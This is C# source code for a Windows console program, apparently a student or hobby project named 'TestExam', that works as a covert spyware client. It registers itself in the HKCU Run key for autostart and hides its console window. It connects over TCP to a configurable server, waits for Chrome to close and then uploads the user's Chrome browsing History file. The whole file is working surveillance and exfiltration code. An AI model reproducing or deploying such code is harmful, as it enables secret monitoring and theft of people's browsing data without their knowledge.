using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace TestExam
{
    internal class Program
    {
        static TcpClient client = new TcpClient();
        static NetworkStream stream = null;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        static void Main(string[] args)
        {

            RegisterAutoRun(); //- добовляет в автозагрузку! Если вписать "true" в метод, то удоляет его оттуда! 

            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); //- Работает консоль в фоновом режиме, если поменять параметр на "SW_SHOW", то в обычном!


            Console.WriteLine(Environment.UserName);
            List<Process> processes = null;
            Process process = null;

            string userName = Environment.UserName;
            Console.Title = userName;

            string msgClose = "Chrome close and History file saved!";
            string msgOpen = "Chrome open";
            string pathHistory = $"C:\\Users\\{userName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History";

            string name = "chrome";
            bool flag = false;


            const int PORT = 8008;
            const string HOST = "127.0.0.1";
            


            try
            {
                client.Connect(HOST, PORT);
                stream = client.GetStream();

                byte[] buffer = Encoding.Unicode.GetBytes(userName);
                stream.Write(buffer, 0, buffer.Length);

                Thread receiveMsgThread = new Thread(ReceiveMsg);
                receiveMsgThread.Start();
                Console.WriteLine($"Welcome, {userName}");

                while (true)
                {
                    do
                    {
                        processes = Process.GetProcesses().ToList<Process>();
                        for (int i = 0; i < processes.Count; i++)
                        {
                            if (name == processes[i].ProcessName)
                            {
                                
                                Console.WriteLine(msgOpen);
                                flag = true;
                                process = Process.GetProcesses()[i];
                                SendMsg(msgOpen);
                                break;
                            }

                        }
                        
                    } while (flag != true);
                    
                    while (true)
                    {
                        if (process.HasExited)
                        {
                            
                            Console.WriteLine(msgClose);
                            flag = false;
                            SendMsg(msgClose);
                            SendFile(pathHistory);
                            break;
                        }
                        Thread.Sleep(5000);
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                
            }
            finally
            {
                Disconnect();
            }
            Console.ReadKey();
            
        }
        static void Disconnect()
        {
            client.Close();
            stream.Close();
        }
        static void ReceiveMsg()
        {
            while (true)
            {
                try
                {
                    byte[] data = new byte[256];
                    StringBuilder builder = new StringBuilder();
                    int byteCount = 0;
                    do
                    {
                        byteCount = stream.Read(data, 0, data.Length);
                        builder.Append(Encoding.Unicode.GetString(data, 0, byteCount));
                    } while (stream.DataAvailable);

                    Console.WriteLine(builder.ToString());
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Disconnect();
                    Environment.Exit(0);
                }
            }
        }
        private static void SendMsg(string msg)
        {
                byte[] data = Encoding.Unicode.GetBytes(msg);
                stream.Write(data, 0, data.Length);
        }
        private static void SendFile(string path)
        {
            string msg = "/@/file";
            byte[] data = Encoding.Unicode.GetBytes(msg);
            client.Client.Send(data);
            /*msg = "History";
            data = Encoding.Unicode.GetBytes(msg);
            client.Client.Send(data);*/
            client.Client.SendFile(path);
            Console.WriteLine("Отправленно!");
        }
        static void RegisterAutoRun(bool remove = false)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string appFullPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string appExeName = System.Diagnostics.Process.GetCurrentProcess().ProcessName;

            if (!remove)
                registryKey.SetValue(appExeName, appFullPath);
            else
                registryKey.DeleteValue(appExeName);
        }
        
       
    }
}
